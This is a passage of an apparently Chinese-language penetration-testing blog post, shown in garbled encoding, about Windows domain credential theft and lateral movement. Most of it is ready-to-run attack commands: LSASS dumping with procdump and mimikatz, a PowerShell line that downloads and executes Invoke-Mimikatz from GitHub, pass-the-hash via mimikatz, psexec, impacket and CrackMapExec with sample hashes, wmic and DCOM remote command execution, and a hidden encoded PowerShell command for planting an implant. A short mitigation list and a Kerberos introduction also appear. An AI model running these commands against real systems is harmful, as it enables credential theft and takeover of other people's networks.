<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220447046.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<ul>
<li>è¿›ç¨‹å¯¼å‡º</li>
</ul>
<ol>
<li><p>ä»»åŠ¡ç®¡ç†å™¨-&gt;è¿›ç¨‹ä¸­åˆ›å»ºè½¬å‚¨æ–‡ä»¶</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>æ˜¯å¾®è½¯çš„å·¥å…·ï¼Œæ€æ¯’è½¯ä»¶ä¸ä¼šæ‹¦æˆª</p>
</li>
</ol>
<blockquote>
<p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p>
<p>å†mimikatzå¯¼å‡ºå¯†ç hash</p>
<p>sekurlsa::minidump lsass.DMP<br>sekurlsa::logonPasswords full</p>
</blockquote>
<p>cs</p>
<p>powershell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br><br>powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -Command \&quot;</span>privilege::debug token::elevate  lsadump::sam <span class="hljs-keyword">exit</span>\<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="é˜²èŒƒæŠ“å–æ˜æ–‡å¯†ç å’Œhash"><a href="#é˜²èŒƒæŠ“å–æ˜æ–‡å¯†ç å’Œhash" class="headerlink" title="é˜²èŒƒæŠ“å–æ˜æ–‡å¯†ç å’Œhash"></a>é˜²èŒƒæŠ“å–æ˜æ–‡å¯†ç å’Œhash</h4><p><strong>1ã€è®¾ç½®Active Directory2012 R2åŠŸèƒ½çº§åˆ«</strong></p>
<p>windows server 2012 R2æ–°å¢äº†ä¸€ä¸ªåä¸º<code>å—ä¿æŠ¤çš„ç”¨æˆ·</code>çš„ç”¨æˆ·ç»„ã€‚å°†éœ€è¦ä¿æŠ¤çš„ç”¨æˆ·æ”¾å…¥è¯¥ç»„ï¼Œåˆ™æ— æ³•ä½¿ç”¨mimikatzç­‰å·¥å…·æŠ“å–æ˜æ–‡å¯†ç å’Œæ•£åˆ—å€¼äº†</p>
<p><strong>2ã€å®‰è£…KB2871997</strong></p>
<p>KB2871997æ˜¯è§£å†³PsExecæˆ–IPCè¿œç¨‹æŸ¥çœ‹ï¼ˆc$ï¼‰é—®é¢˜çš„è¡¥ä¸ï¼Œè¢«ä½¿æœ¬åœ°è´¦å·ä¸å†è¢«å…è®¸è¿œç¨‹æ¥å…¥è®¡ç®—æœºç³»ç»Ÿï¼Œä½†ç³»ç»Ÿé»˜è®¤çš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·Administratorè¿™ä¸ªSIDä¸º500çš„ç”¨æˆ·ä¾‹å¤–ï¼Œæ”¹åä¹Ÿæ²¡æ³•ï¼Œå› ä¸ºSIDæ˜¯ä¸å˜çš„ï¼Œä¾æ—§å¯ä»¥æ¨ªå‘è·å–å†…ç½‘å…¶ä»–è®¡ç®—æœºçš„æƒé™ï¼Œéœ€è¦ç¦ç”¨é»˜è®¤çš„Administratorè´¦å·ï¼Œåˆ™å¯é˜²å¾¡å“ˆå¸Œä¼ é€’</p>
<p><strong>3ã€é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ç¦æ­¢åœ¨å†…å­˜ä¸­å­˜å‚¨æ˜æ–‡å¯†ç </strong></p>
<p>WDigeståè®®ï¼Œè¯¥åè®®èƒ½å¤Ÿä½¿Windowså°†æ˜æ–‡å¯†ç å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä»¥æ–¹ä¾¿ç”¨æˆ·ç™»å½•æœ¬åœ°è®¡ç®—æœºï¼Œå¯é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼ï¼Œè§£å†³å†…å­˜ä¸­ä»¥æ˜æ–‡å­˜å‚¨å¯†ç çš„é—®é¢˜</p>
<p><strong>4ã€é˜²å¾¡mimikatz</strong></p>
<p>mimikatzåœ¨æŠ“å–æ•£åˆ—å€¼æˆ–æ˜æ–‡å¯†ç æ—¶éœ€è¦ä½¿ç”¨Debugæƒé™ï¼ˆå› ä¸ºmimikatzéœ€å‘€å’Œlsassè¿›ç¨‹è¿›è¡Œäº¤äº’ï¼Œå¦‚æœæ²¡æœ‰Debugæƒé™ï¼Œmimikatzå°†ä¸èƒ½è¯»å–lsassè¿›ç¨‹ï¼‰ã€‚å°†æ‹¥æœ‰Debugæƒé™çš„æœ¬åœ°ç®¡ç†å‘˜ä»Administratorç»„ä¸­åˆ é™¤,é‡å¯</p>
<h2 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h2><p><strong>æˆªå–åˆ°hashåï¼Œå“ˆå¸Œä¼ é€’ä¸€èˆ¬æ˜¯åœ¨éåŸŸç”¨æˆ·ä¸­è¿›è¡Œä¼ é€’ï¼Œå®éªŒæ—¶å‘ç°ï¼ŒåŸŸç”¨æˆ·ä¸ç”¨è¿›è¡Œhashä¼ é€’å°±å¯ä»¥å»ºç«‹IPCè¿æ¥</strong></p>
<p><code>å“ˆå¸Œä¼ é€’ï¼ˆPass The Hashï¼‰æ”»å‡»</code>ï¼Œè¯¥æ–¹æ³•é€šè¿‡æ‰¾åˆ°ä¸è´¦æˆ·ç›¸å…³çš„å¯†ç æ•£åˆ—å€¼ï¼Œé€šå¸¸æ˜¯<code>NTLM Hash</code>æ¥è¿›è¡Œæ”»å‡»ã€‚åŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·ç™»å½•è®¡ç®—æœºæ—¶ä½¿ç”¨çš„å¤§éƒ½æ˜¯åŸŸè´¦å·ï¼Œå¤§é‡è®¡ç®—æœºåœ¨å®‰è£…æ—¶ä¼šä½¿ç”¨ç›¸åŒçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ã€‚è‹¥è®¡ç®—æœºçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç æ˜¯ç›¸åŒçš„ï¼Œå°±å¯ä»¥ä½¿ç”¨å“ˆå¸Œä¼ é€’çš„æ–¹æ³•ç™»å½•å†…ç½‘ä¸­çš„å…¶ä»–è®¡ç®—æœºï¼Œè¿™ç§å“ˆå¸Œä¼ é€’ï¼Œå¯ä»¥çœå»ç ´è§£å¯†ç æ•£åˆ—å€¼ï¼Œå³è·å¾—å¯†ç æ˜æ–‡çš„æ­¥éª¤</p>
<p>Windowsä¸­ï¼Œæ•£åˆ—å€¼æ˜¯ç”¨æ¥è¯æ˜èº«ä»½çš„ï¼ˆæœ‰æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç æ•£åˆ—å€¼ï¼Œå°±èƒ½é€šè¿‡éªŒè¯ï¼‰ã€‚åœ¨windows server 2012 R2  åŠä¹‹åçš„æ“ä½œç³»ç»Ÿä¸­ï¼Œé»˜è®¤åœ¨å†…å­˜ä¸ä¼šè®°å½•æ˜æ–‡å¯†ç ã€‚å› æ­¤å¯ä½¿ç”¨å·¥å…·å°†æ•£åˆ—å€¼ä¼ é€’åˆ°å…¶ä»–è®¡ç®—æœºï¼Œè¿›è¡Œæƒé™éªŒè¯ï¼Œè¿›è€Œå¯¹å…¶ä»–è®¡ç®—æœºè·å–æ§åˆ¶æƒé™</p>
<ol>
<li>mimikatz</li>
</ol>
<blockquote>
<p>privilege::debug</p>
<p>sekurlsa::pth /user:Administrator /domain:god /ntlm:8a963371a63944419ec1adf687bb1be5  //ä½¿ç”¨ntlmä¼ é€’</p>
<p><strong>Pass the key</strong></p>
<p>ä¹Ÿå¯ä»¥ç”¨AES-256ç­‰ä¼ é€’ï¼Œ<strong>è·å–ï¼šsekurlsa::ekeys</strong>  </p>
<p>è¿˜æ˜¯ä½¿ç”¨IPCç­‰æ— å¯†ç è¿æ¥åˆ°ç›®AESæ ‡ä¸»æœºï¼Œdir \STU1\C$</p>
</blockquote>
<p>å¯è§ï¼Œæ²¡æœ‰è¿›è¡Œhashä¿®æ”¹çš„IPCç­‰è¿æ¥ä¼šå‡ºç°ç™»å½•å¤±è´¥</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404135504518.png" srcset="/img/loading.gif" lazyload></p>
<ol start="2">
<li>psexec</li>
</ol>
<p>å¾®è½¯å®˜æ–¹ç‰ˆæœ¬ï¼š<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
<blockquote>
<p>éœ€è¦è¿œç¨‹ç³»ç»Ÿå¼€å¯admin$å…±äº«ï¼ˆé»˜è®¤æ˜¯å¼€å¯çš„ï¼‰</p>
<p>åœ¨ä½¿ç”¨ipc$è¿æ¥ç›®æ ‡ç³»ç»Ÿåï¼Œä¸éœ€è¦è¾“å…¥è´¦å·å’Œå¯†ç </p>
<p>ä½¿ç”¨PsExecæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œç”±äºåˆ›å»ºæˆ–åˆ é™¤æœåŠ¡æ—¶<strong>ä¼šäº§ç”Ÿå¤§é‡çš„æ—¥å¿—ï¼Œå¯é€šè¿‡æ—¥å¿—åæ¨æ”»å‡»æµç¨‹</strong></p>
<p><strong>ä½¿ç”¨PsExecå¯ä»¥ç›´æ¥è·å¾—systemæƒé™çš„äº¤äº’å¼shell</strong></p>
<p>å»ºç«‹IPCåä½¿ç”¨ï¼Œå¯ä»¥å¼¹å›ä¸€ä¸ªshell</p>
<p>net use \\192.168.20.128 â€œpasswordâ€ /user:Administrator</p>
<p>//-accepteula ç¬¬ä¸€æ¬¡æ‰§è¡ŒPsExecæ—¶ä¼šå¼¹å‡ºç¡®è®¤æ¡†ï¼Œè€Œä½¿ç”¨è¯¥å‚æ•°å°±å¯ä»¥åœ¨é™é»˜æ¨¡å¼ä¸‹è¿è¡Œè€Œä¸ä¼šè¢«å‘ç° -s system</p>
<p>psexec.exe -accepteula \\192.168.20.128 -s cmd.exe</p>
<p>psexec.exe -accepteula \\192.168.20.128 cmd.exe</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/psexec.gif" srcset="/img/loading.gif" lazyload alt="psexec"></p>
<p>æ²¡æœ‰å»ºç«‹IPC</p>
<p>PsExec.exe \192.168.20.128 -u QWE\Administrator -p password cmd.exe</p>
</blockquote>
<p>ä½¿ç”¨PsExecï¼Œä¼šåœ¨ç›®æ ‡æœºä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„æœåŠ¡PSEXESVCï¼›åœ¨ç»“æŸäº¤äº’åï¼ŒPsExecæœåŠ¡ä¼šè‡ªåŠ¨åˆ é™¤ï¼Œä½†æ˜¯åœ¨åˆ›å»ºä»¥åŠåˆ é™¤æ—¶ä¼šäº§ç”Ÿå¤§é‡æ—¥å¿—ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥åŸºäºæ­¤å¯¹æ”»å‡»è€…è¿›è¡Œæº¯æºã€‚æ‹œè¯»äº†ä¸€ä¸‹<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/146441.html">é…’ä»™æ¡¥å…­å·éƒ¨é˜Ÿçš„æµ…è°ˆPSEXECåšçš„é‚£äº›äº‹</a></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
<blockquote>
<p>python psexec.py  <a href="mailto:&#x41;&#x64;&#109;&#x69;&#110;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#x30;&#x2e;&#49;&#x32;&#x38;">&#x41;&#x64;&#109;&#x69;&#110;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#x30;&#x2e;&#49;&#x32;&#x38;</a>   -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">impacket-win</a></p>
<p>å¾®è½¯è‡ªå¸¦çš„psexecæˆ‘æ˜¯é€šè¿‡ä½¿ç”¨mimikatzå“ˆå¸Œä¼ é€’åå»ºç«‹IPCè¿æ¥ç„¶åpsexecå»è·å¾—shellï¼Œè¿™ä¸ªå·¥å…·åŒ…å¯ä»¥è‡ªå·±pth</p>
<p>ç”¨æ³•ï¼š</p>
<blockquote>
<p>Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</p>
<p>usage: psexec.exe [-h] [-c pathname] [-path PATH] [-file FILE] [-debug]<br>               [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]<br>               [-dc-ip ip address] [-target-ip ip address]<br>               [-port [destination port]] [-service-name service name]<br>               target [command [command â€¦]]</p>
<p>PSEXEC like functionality example using RemComSvc.</p>
<p>positional arguments:<br>target                [[domain/]username[:password]@]&lt;targetName or address&gt;<br>command               command (or arguments if -c is used) to execute at the<br>                     target (w/o path) - (default:cmd.exe)</p>
<p>optional arguments:<br>-h, â€“help            show this help message and exit<br>-c pathname           copy the filename for later execution, arguments are<br>                     passed in the command option<br>-path PATH            path of the command to execute<br>-file FILE            alternative RemCom binary (be sure it doesnâ€™t require<br>                     CRT)<br>-debug                Turn DEBUG output ON</p>
<p>authentication:<br><strong>-hashes LMHASH:NTHASH</strong><br>                     NTLM hashes, format is LMHASH:NTHASH<br>-no-pass              donâ€™t ask for password (useful for -k)<br>-k                    Use Kerberos authentication. Grabs credentials from<br>                     ccache file (KRB5CCNAME) based on target parameters.<br>                     If valid credentials cannot be found, it will use the<br>                     ones specified in the command line<br>-aesKey hex key       AES key to use for Kerberos Authentication (128 or 256<br>                     bits)</p>
<p>connection:<br>-dc-ip ip address     IP Address of the domain controller. If omitted it<br>                     will use the domain part (FQDN) specified in the<br>                     target parameter<br>-target-ip ip address<br>                     IP Address of the target machine. If omitted it will<br>                     use whatever was specified as target. This is useful<br>                     when target is the NetBIOS name and you cannot resolve<br>                     it<br>-port [destination port]<br>                     Destination port to connect to SMB Server<br>-service-name service name<br>                     This will be the name of the service</p>
</blockquote>
<blockquote>
<p>psexec.exe <a href="mailto:&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x32;&#x30;&#46;&#49;&#50;&#x38;">&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x32;&#x30;&#46;&#49;&#50;&#x38;</a> -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<p>msfä¹Ÿæœ‰psexecæ¨¡å—</p>
<ol start="3">
<li>WMI</li>
</ol>
<p>ç”±äºPsExecå¨åŠ›å¾ˆå¤§ï¼Œä¹Ÿè¢«åˆ—å…¥é»‘åå•ï¼Œè€Œä¸”å®¹æ˜“æš´éœ²ï¼Œäºæ˜¯å°±ä½¿ç”¨äº†éšè”½æ€§æ›´å¥½çš„WMI</p>
<p>WMIæ˜¯â€œWindows Management Instrumentationâ€çš„ç¼©å†™ï¼ŒWMIæ˜¯ä»Windows98å¼€å§‹ï¼Œç³»ç»Ÿè‡ªå¸¦çš„ä¸€ç³»åˆ—å·¥å…·é›†ã€‚WMIæä¾›äº†/nodeé€‰é¡¹ï¼Œå¯ä»¥é€šè¿‡135ç«¯å£ä¸Šçš„RPCæœåŠ¡è¿›è¡Œè¿œç¨‹è®¿é—®ï¼Œæˆ–è€…æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚Windowsæ“ä½œç³»ç»Ÿé»˜è®¤ä¸ä¼šå°†WMIçš„æ“ä½œè®°å½•åˆ°æ—¥å¿—å½“ä¸­ï¼Œè€Œä¸”å› ä¸ºé‡‡ç”¨çš„æ˜¯æ— æ–‡ä»¶æ”»å‡»ï¼Œæ‰€ä»¥å¯¼è‡´WMIå…·æœ‰æé«˜çš„éšè”½æ€§ã€‚ç”±æ­¤ï¼Œè¶Šæ¥è¶Šå¤šçš„APTå¼€å§‹ä½¿ç”¨WMIè¿›è¡Œæ”»å‡»ï¼Œåˆ©ç”¨WMIå¯ä»¥è¿›è¡Œä¿¡æ¯æ”¶é›†ã€æ¢æµ‹ã€åç—…æ¯’ã€è™šæ‹Ÿæœºæ£€æµ‹ã€å‘½ä»¤æ‰§è¡Œã€æƒé™æŒä¹…åŒ–ç­‰æ“ä½œã€‚</p>
<blockquote>
<p>wmic /node:192.168.20.128 /user:Administrator /password:p@ssword123. process call create â€œcmd.exe /c ipconfig &gt;c:\ip.txtâ€</p>
</blockquote>
<p>å»ºç«‹IPCåï¼Œtypeè¯»å–txt</p>
<blockquote>
<p>net use \DC â€œp@ssword123.â€ /user:Administrator<br>type \DC\C$\ip.txt</p>
</blockquote>
<p>ä½¿ç”¨wmicè¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼Œåœ¨è¿œç¨‹ç³»ç»Ÿä¸­å¯åŠ¨windows management lnstrumentation  æœåŠ¡ï¼ˆç›®æ ‡æœåŠ¡å™¨éœ€è¦å¼€æ”¾135ç«¯å£ï¼Œwmicä¼šä»¥ç®¡ç†å‘˜æƒé™åœ¨è¿œç¨‹ç³»ç»Ÿä¸­æ‰§è¡Œå‘½ä»¤ï¼‰ã€‚å¦‚æœç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†é˜²ç«å¢™ï¼Œwmicå°†æ— æ³•è¿›è¡Œè¿æ¥ã€‚wmicå‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦ä½¿ç”¨<code>ipc$å’Œtype</code>å‘½ä»¤æ¥è¯»å–ä¿¡æ¯ï¼Œè‹¥ä½¿ç”¨wmicæ‰§è¡Œæ¶æ„ç¨‹åºï¼Œå°†ä¸ä¼šç•™ä¸‹æ—¥å¿—</p>
<p>è¿˜æ˜¯ä½¿ç”¨impacketçš„ä¸¤ä¸ªå·¥å…·åŒ…ï¼Œæœ‰äº›è¿˜æ”¯æŒsocksä»£ç†</p>
<blockquote>
<p>wmiexec.exe domain/user:password@target-ip</p>
<p>wmiexec.exe QWE/Administrator:p@<a href="mailto:&#115;&#x73;&#x77;&#111;&#114;&#x64;&#49;&#x32;&#x33;&#x2e;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#48;&#x2e;&#x31;&#x32;&#56;">&#115;&#x73;&#x77;&#111;&#114;&#x64;&#49;&#x32;&#x33;&#x2e;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#48;&#x2e;&#x31;&#x32;&#56;</a></p>
</blockquote>
<ol start="4">
<li><a target="_blank" rel="noopener" href="https://github.com/sunorr/smbexec">smbexec</a></li>
<li>DOM</li>
</ol>
<p><code>DCOMï¼ˆåˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼‰</code>æ˜¯å¾®è½¯çš„ä¸€ç³»åˆ—æ¦‚å¿µå’Œç¨‹åºæ¥å£ã€‚é€šè¿‡DOCM,å®¢æˆ·ç«¯ç¨‹åºå¯¹è±¡èƒ½å¤Ÿå‘ç½‘ç»œä¸­çš„å¦ä¸€å°è®¡ç®—æœºä¸Šçš„æœåŠ¡å™¨ç¨‹åºå¯¹è±¡å‘é€è¯·æ±‚ã€‚DCOMæ˜¯åŸºäºç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼ˆCOMï¼‰çš„ã€‚COMæä¾›äº†ä¸€å¥—å…è®¸åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œé€šä¿¡çš„æ¥å£ï¼ˆè¿è¡Œåœ¨Windows95åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸­ï¼‰</p>
<p><code>Get-CimInstance</code>è¿™ä¸ªcmdletï¼ˆPowerShellå‘½ä»¤è¡Œï¼‰é»˜è®¤åªåœ¨powershell3.0ä»¥ä¸Šç‰ˆæœ¬ä¸­å­˜åœ¨ã€‚å› æ­¤åªåœ¨windows server 2012åŠä»¥ä¸Šæœ¬æœ¬çš„æ“ä½œç³»ç»Ÿæ‰å¯ä»¥ä½¿ç”¨Get-CimInstance</p>
<blockquote>
<p> Get-CimInstance Win32_DCOMApplication //è·å–DCOMç¨‹åºåˆ—è¡¨</p>
</blockquote>
<p><code>Windows7ã€Windows server 2008</code>ä¸­é»˜è®¤å®‰è£…çš„æ˜¯<code>powershell 2.0</code>ã€‚ä¸æ”¯æŒGet-CimInstanceã€‚å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä»£æ›¿</p>
<blockquote>
<p>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication //è·å–DCOMç¨‹åºåˆ—è¡¨</p>
</blockquote>
<p>è·å–åˆ°DCOMç¨‹åºåˆ—è¡¨åï¼Œ<strong>å»ºç«‹IPC</strong>ï¼Œæœ€åæ‰§è¡Œå‘½ä»¤(è¿™ä¸ªæ–¹æ³•éœ€è¦å…³é—­ç³»ç»Ÿé˜²ç«å¢™ã€‚åœ¨è¿œç¨‹æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå¿…é¡»ä½¿ç”¨å…·æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™çš„è´¦å·)</p>
<ul>
<li>è°ƒç”¨<code>MMC20.Application</code>è¿œç¨‹æ‰§è¡Œå‘½ä»¤</li>
</ul>
<blockquote>
<p>$com=[activator]::CreateInstance([type]::GetTypeFromProgID(â€œMMC20.Applicationâ€,â€ipâ€))<br>$com.Document.ActiveView.ExecuteShellCommand(â€˜cmd.exeâ€™,$null,â€/c calc.exeâ€,â€Minimzedâ€)</p>
</blockquote>
<ul>
<li>è°ƒç”¨<code>9BA05972-F6A8-11CF-A442-00A0C90A8F39</code></li>
</ul>
<blockquote>
<p>$com = [Type]::GetTypeFromCLSID(â€˜9BA05972-F6A8-11CF-A442-00A0C90A8F39â€™, â€œipâ€)<br>$obj = [System.Activator]::CreateInstance($com)<br>$item = $obj.item()<br>$item.Document.Application.ShellExecute(â€œcmd.exeâ€,â€/c calc.exeâ€, â€œc:\windows\system32â€,$null,0)</p>
</blockquote>
<ol start="7">
<li><strong>æ‰¹é‡ç§»åŠ¨</strong></li>
</ol>
<p>CrackMapExecé›†æˆäº†wmiexecã€atexeã€smbexecï¼Œé›†æˆäº†smbæ‰«æ,å£ä»¤çˆ†ç ´ç­‰åŠŸèƒ½,éå¸¸é€‚åˆæ‹¿æ¥å¿«é€Ÿç§»åŠ¨</p>
<p>å…¶ä¸­ï¼Œæ‰¹é‡ä¼ é€’hashï¼š(88,90å¤šä¸ªç›®æ ‡ä½¿ç”¨ç›¸åŒhashä¼ é€’)</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de<br><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de  -x <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>

<p>é…åˆcsä¸Šé©¬</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.211.55.51</span>  <span class="hljs-number">10.211.55.52</span> -u administrator  -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de -x <span class="hljs-string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><h3 id="Kerberosåè®®è®¤è¯è¿‡ç¨‹"><a href="#Kerberosåè®®è®¤è¯è¿‡ç¨‹" class="headerlink" title="Kerberosåè®®è®¤è¯è¿‡ç¨‹"></a>Kerberosåè®®è®¤è¯è¿‡ç¨‹</h3><p>Kerberosåè®®æ˜¯ä¸€ç§åŸºäºç¬¬ä¸‰æ–¹å¯ä¿¡ä¸»æœºçš„è®¡ç®—æœºç½‘ç»œåè®®ï¼Œç”¨æ¥åœ¨éå®‰å…¨ç½‘ç»œä¸­ï¼Œå¯¹ä¸ªäººé€šä¿¡ä»¥å®‰å…¨çš„æ‰‹æ®µè¿›è¡Œèº«ä»½è®¤è¯ã€‚Kerberosåè®®åœ¨åœ¨å†…ç½‘åŸŸæ¸—é€ä¸­è‡³å…³é‡è¦ï¼Œç™½é“¶ç¥¨æ®ã€é»„é‡‘ç¥¨æ®ã€æ”»å‡»åŸŸæ§ç­‰éƒ½ç¦»ä¸å¼€kerberosåè®®ã€‚</p>
<p><strong>å…³é”®è§’è‰²ï¼š</strong></p>
<ul>
<li><strong>Domain Controller (åŸŸæ§åˆ¶å™¨)ï¼Œç®€ç§°DCï¼Œä¸€å°è®¡ç®—æœºï¼Œå®ç°ç”¨æˆ·ã€è®¡ç®—æœºçš„ç»Ÿä¸€ç®¡ç†ã€‚</strong></li>
<li><strong>Key Distribution Center(ç§˜é’¥åˆ†å‘ä¸­å¿ƒ)ï¼Œç®€ç§°KDCï¼Œé»˜è®¤å®‰è£…åœ¨åŸŸæ§é‡Œï¼ŒåŒ…æ‹¬ASå’ŒTGSã€‚</strong> </li>
<li><strong>Authentication Service(èº«ä»½éªŒè¯æœåŠ¡)ï¼Œç®€ç§°ASï¼Œç”¨äºKDCå¯¹Clientè®¤è¯ã€‚</strong> </li>
<li><strong>Ticket Grantng Service (ç¥¨æ®æˆäºˆæœåŠ¡)ï¼Œç®€ç§°TGSï¼Œç”¨äºKDCå‘Clientå’ŒServeråˆ†å‘Session Keyï¼ˆä¸´æ—¶keyï¼‰ã€‚</strong> </li>
<li><strong>Active Directory(æ´»åŠ¨ç›®å½•)ï¼Œç®€ç§°ADï¼Œç”¨äºå­˜å‚¨ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€åŸŸç›¸å…³çš„ä¿¡æ¯ã€‚</strong> </li>
<li><strong>Client å®¢æˆ·ç«¯ï¼ŒæŒ‡ç”¨æˆ·ã€‚</strong> </li>
<li><strong>Server æœåŠ¡ç«¯ï¼Œå¯èƒ½æ˜¯æŸå°è®¡ç®—æœºï¼Œä¹Ÿå¯èƒ½æ˜¯æŸä¸ªæœåŠ¡ã€‚</strong></li>
</ul>
<p>æ‰“ä¸ªæ¯”æ–¹ï¼šå½“whoamiè¦å’Œbunnyè¿›è¡Œé€šä¿¡çš„æ—¶å€™ï¼Œwhoamiå°±éœ€è¦å‘bunnyè¯æ˜è‡ªå·±æ˜¯whoamiï¼Œç›´æ¥çš„æ–¹å¼å°±æ˜¯whoamiç”¨äºŒäººä¹‹é—´çš„ç§˜å¯†åšç§˜é’¥åŠ å¯†æ˜æ–‡æ–‡å­—ç”Ÿæˆå¯†æ–‡ï¼ŒæŠŠå¯†æ–‡å’Œæ˜æ–‡æ–‡å­—ä¸€å—å‘é€ç»™bunnyï¼Œbunnyå†ç”¨ç§˜å¯†è§£å¯†å¾—åˆ°æ˜æ–‡ï¼ŒæŠŠæ˜æ–‡å’Œæ˜æ–‡æ–‡å­—è¿›è¡Œå¯¹æ¯”ï¼Œè‹¥ä¸€è‡´ï¼Œåˆ™è¯æ˜æ˜¯whoamiã€‚</p>
